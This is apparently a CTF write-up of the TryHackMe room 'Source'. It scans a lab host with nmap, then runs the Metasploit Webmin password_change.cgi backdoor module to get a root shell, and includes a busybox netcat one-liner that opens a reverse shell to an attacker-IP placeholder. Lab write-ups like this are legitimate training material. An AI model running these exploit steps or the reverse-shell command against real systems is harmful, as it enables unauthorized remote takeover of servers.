---
title: "Source"
date: 2025-01-25
image: /assets/img/tryhackme/Source/Source_image.jpg
description: Writeup of the TryHackMe-CTF Source
categories: [Tryhackme, Easy]
tags: [linux, webmin, exploit, metasploit]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Source</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/source">https://tryhackme.com/r/room/source</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Source.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.117.181
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 08:23 EST
  Nmap scan report for 10.10.117.181
  Host is up (0.043s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  22/tcp    open  ssh
  10000/tcp open  snet-sensor-mgmt

  Nmap done: 1 IP address (1 host up) scanned in 35.07 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,10000 10.10.117.181
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 08:24 EST
  Nmap scan report for 10.10.117.181
  Host is up (0.035s latency).

  PORT      STATE SERVICE VERSION
  22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
  |   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
  |_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
  10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 36.59 seconds
```
From here I proceeded the analysis with port 10000.

## Port 10000 Analysis
When I first accessed the website I got the following error:

![Error](/assets/img/tryhackme/Source/thm_source_1.jpg){: width="1016" height="103"}

I added the domain name in the `etc/hosts` file and a Webmin portal was presented:

![Webmin](/assets/img/tryhackme/Source/thm_source_2.jpg){: width="318" height="354"}

After some inital enumeration I serarched for an exploit and found an <a href="https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search">attackerkb</a> entry. In the last comment stands something about metasploit.

```bash
msf6 > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .
```
The backdoor exploit sounds great, so I loaded the `Webmin password_change.cgi Backdoor`:
```bash
msf6 > use exploit/linux/http/webmin_backdoor
msf6 exploit(linux/http/webmin_backdoor) > set lhost 10.21.63.26
  lhost => [attacker ip]
msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.117.181
  rhosts => 10.10.117.181
msf6 exploit(linux/http/webmin_backdoor) > set ssl true
  [!] Changing the SSL option's value may require changing RPORT!
  ssl => true
msf6 exploit(linux/http/webmin_backdoor) > exploit

  [*] Started reverse TCP handler on 10.21.63.26:4444 
  [*] Running automatic check ("set AutoCheck false" to disable)
  [+] The target is vulnerable.
  [*] Configuring Automatic (Unix In-Memory) target
  [*] Sending cmd/unix/reverse_perl command payload
  [*] Command shell session 1 opened (10.21.63.26:4444 -> 10.10.117.181:48376) at 2025-01-25 08:43:09 -0500
  
  whoami
  root
  busybox nc [attacker ip] 9001 -e sh 
```
I wasn't able to change the directory from the shell so I started a reverse shell using `busybox`:
```bash
cd /root
	cat root.txt
	THM{*** removed ***}
cd /home
ls
	dark
cd dark
cat user.txt
	THM{*** removed ***}
```

solved! :)
